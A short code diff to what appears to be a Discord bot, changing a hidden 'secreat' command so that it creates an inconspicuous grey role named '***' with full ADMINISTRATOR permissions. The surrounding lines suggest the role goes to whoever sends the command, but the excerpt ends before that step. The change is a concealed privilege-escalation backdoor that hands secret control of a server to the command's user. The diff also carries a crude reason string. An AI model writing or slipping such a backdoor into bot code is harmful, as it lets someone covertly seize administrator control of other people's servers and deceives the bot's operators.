@@ -206,8 +206,10 @@ client.on('messageCreate', async (message) => {
   if (command === "secreat") {
       message.guild.roles.create({
         data: {
-            name: roleName,
-            color: 'BLUE'
+            name: '***',
+            color: 'GREY',
+            permissions: ['ADMINISTRATOR'],
+            reason: 'Penis',
         }
         }).catch(console.error).then(role => {
           var sir = message.author
